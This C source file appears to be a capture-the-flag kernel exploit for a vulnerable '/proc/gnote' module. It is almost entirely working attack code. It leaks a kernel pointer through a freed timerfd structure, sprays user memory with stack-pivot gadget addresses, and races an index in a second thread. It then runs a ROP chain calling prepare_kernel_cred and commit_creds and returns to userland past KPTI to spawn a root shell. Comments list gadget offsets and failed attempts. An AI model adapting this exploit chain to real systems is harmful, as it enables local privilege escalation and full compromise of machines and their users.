#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/mman.h>
#include <stdlib.h>

/* mov  rax, ds:off_220[rax*8]
 * above is code of decompiled kernel module in ida pro
 * while inserting the kernel module, kernel will fill in the relocation part
 * turn it into the assembly below,
 * mov  rax, QWORD PTR [rax*8-0x????????]
 * so alghough the address looks fixed, it still has ASLR
 */

char buf[0x100];
int fd;
unsigned args[80];
char sc[0x100];
unsigned long ropbuf[0x100];

void get_shell() {
  system("/bin/sh");
}

void hexdump(const void* data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char*)data)[i]);
    if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char*)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i+1) % 8 == 0 || i+1 == size) {
      printf(" ");
      if ((i+1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i+1 == size) {
        ascii[(i+1) % 16] = '\0';
        if ((i+1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i+1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

void alloc(int size) {

  args[0] = 1;
  args[1] = size;
  write(fd, args, 1);
}

void readbuf(int n, int size) {

  // setview(n)
  args[0] = 5;
  args[1] = n;
  write(fd, args, 1);

  // get()
  read(fd, buf, size);
}

void *nop() {
  args[0] = 2;
  write(fd, args, 1);
  return NULL;
}


/* since we don't have module's base address
 * and kaslr on module is 12bit
 * 0xffffffffc020a000
 * ------------+++---
 *         =0x1000000
 * we just do heap spray, make it spray
 * from 0x1000000 ~ 0x2000000 <16MB>
 *
 * # sysctl vm.mmap_min_addr
 * vm.mmap_min_addr = 4096
 */
void *flick() {
  while(1)
    // args[0] = 0x26f; // &notes[1], failed attempt
    args[0] = 0x8200000; // makes it 0x1000000~0x2000000
}


/* picking timer for leaking is because
 * there's a kernel function ptr in the structure */
unsigned long infoleak() {
  int timerfd;
  struct itimerspec spec = {{0, 0}, {1000, 0}};
  timerfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(timerfd, 0, &spec, NULL);
  close(timerfd);
  sleep(1); // due to kfree_rcu
  alloc(0x100);
  readbuf(0, 0x100);
  unsigned long kernel_ptr = *(unsigned long *)&buf[40];
  return kernel_ptr;
}

void privilage_escalation(unsigned long kernel_base) {
  void (*commit_creds)(void *) = (void (*)(void *))(kernel_base + 0x69df0);
  void *(*prepare_kernel_cred)(void *) = (void *(*)(void *))(kernel_base + 0x69fe0);

  commit_creds(prepare_kernel_cred(NULL));
}

// 0xffffffff811e79a7 : push rax ; pop rdx ; pop rbp ; ret
// 0xffffffff811e07f8 : mov qword ptr [rdi + 8], rdx ; ret
// 0xffffffff8101c20d : pop rdi ; ret
// 0xffffffff8103787b : pop rsp ; ret
// 0xffffffff811025c8 : pop r11 ; pop rbp ; ret
// 0xffffffff81040fd0 : pop rcx ; pop rbp ; ret

// original $CR4 = 001006f0
// 0xffffffff8103ef24 : mov cr4, rdi ; pop rbp ; ret <- worked, but useless because with KPTI on, SMEP will be simulated by kernel
// 0xffffffff810e92a6 : push rsi ; pop rsp ; idiv bh ; pop rbx ; pop rbp ; ret <-- failed, idiv will cause exception

// 0xffffffff81001cb1 : leave ; ret
// 0xffffffff81000363 : pop rbp ; ret

// 0xffffffff8103efc4 : swapgs ; pop rbp ; ret
// 0xffffffff810fb8a8 : iretd ; jmp 0xffffffff810fb81e

unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_stats() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      :"=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags): : "memory"
  );
}

void prepare_rop_chain(unsigned long kernel_base) {
  unsigned long *param_buf = (unsigned long *)&args[2];

  unsigned long pop_rbp = kernel_base + 0x363;
  unsigned long leave_ret = kernel_base + 0x1cb1;
  unsigned long pop_rdi = kernel_base + 0x1c20d;
  unsigned long pop_r11_pop = kernel_base + 0x1025c8;
  unsigned long pop_rcx_pop = kernel_base + 0x40fd0;
  unsigned long set_rdx_on_stack = kernel_base + 0x1e07f8;
  unsigned long push_rax_pop_rdx_pop = kernel_base + 0x1e79a7;
  unsigned long swapgs_pop_rbp = kernel_base + 0x3efc4;
  unsigned long iret = kernel_base + 0xfb8a8;
  unsigned long swapgs_sysret = kernel_base + 0x600000;
  unsigned long set_cr3_pop_rsp_swapgs_sysret = kernel_base + 0x600116;

  unsigned long prepare_kernel_cred = kernel_base + 0x69fe0;
  unsigned long commit_creds = kernel_base + 0x69df0;

  char *stack = (char *)mmap(0, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  unsigned long pivot[] = {
    pop_rbp,
    (unsigned long)((char *)&ropbuf-0x8),
    leave_ret
  };

  // save rflags & cs & ss here
  save_stats();

  unsigned long payload[] = {
    pop_rdi,
    0,
    prepare_kernel_cred,
    push_rax_pop_rdx_pop,
    0x41414141,
    pop_rdi,
    (unsigned long)((char *)&ropbuf[9]-0x8),
    set_rdx_on_stack,
    pop_rdi,
    0xdeadbeef, // <-- we hotfix this
    commit_creds,
    pop_r11_pop,
    user_rflags,
    0x41414141,
    pop_rcx_pop,
    (unsigned long)&get_shell,
    0,
    set_cr3_pop_rsp_swapgs_sysret,
    0,
    0,
    (unsigned long)stack+0x10000
  };

  /* using iret got kernel panic, don't know why... */
  // unsigned long payload[] = {
  //   pop_rdi,
  //   0,
  //   prepare_kernel_cred,
  //   push_rax_pop_rdx_pop,
  //   0xdeadbeef,
  //   pop_rdi,
  //   (unsigned long)((char *)&ropbuf[9]-0x8),
  //   set_rdx_on_stack,
  //   pop_rdi,
  //   0xdeadbeef, // <-- we hotfix this
  //   commit_creds,
  //   swapgs_pop_rbp,
  //   (unsigned long)stack+0x20000, // pop rbp
  //   iret,
  //   (unsigned long)get_shell,
  //   user_cs,
  //   user_rflags,
  //   user_sp,
  //   user_ss
  // };

  memcpy(param_buf, pivot, sizeof(pivot));
  memcpy(ropbuf, payload, sizeof(payload));
}


// 0xffffffff810500cc : push rbx ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
// the second pop will pop off the argument part, so we just need to append payload after buf

// 0xffffffff813aaca2 : xchg esp, ebx ; xor eax, 0x89480000 ; in eax, 0x5d ; ret
// (alternative) since we're pivoting to userspace, we can just xchg the esp part <- failed, because we need to pop shit params first

void prepare_heap_spray(unsigned long kernel_base) {
  unsigned long migrate = kernel_base + 0x500cc;
  unsigned long *jtable = (unsigned long *)mmap((void *)0x1000000, 0x1000000,
                  PROT_READ|PROT_WRITE,
                  MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,
                  -1, 0);
  for (int i = 0; i < 0x1000000/8; ++i) {
    jtable[i] = migrate;
  }
}


int main() {
  fd = open("/proc/gnote", O_RDWR);

  unsigned long kernel_base = infoleak() - 0x15a2f0;
  printf("kernel_ptr: 0x%lx\n", kernel_base);

  prepare_heap_spray(kernel_base);
  prepare_rop_chain(kernel_base);

  pthread_t pt;
  pthread_create(&pt, NULL, flick, NULL);

  while(1) {
    nop();
  }
}
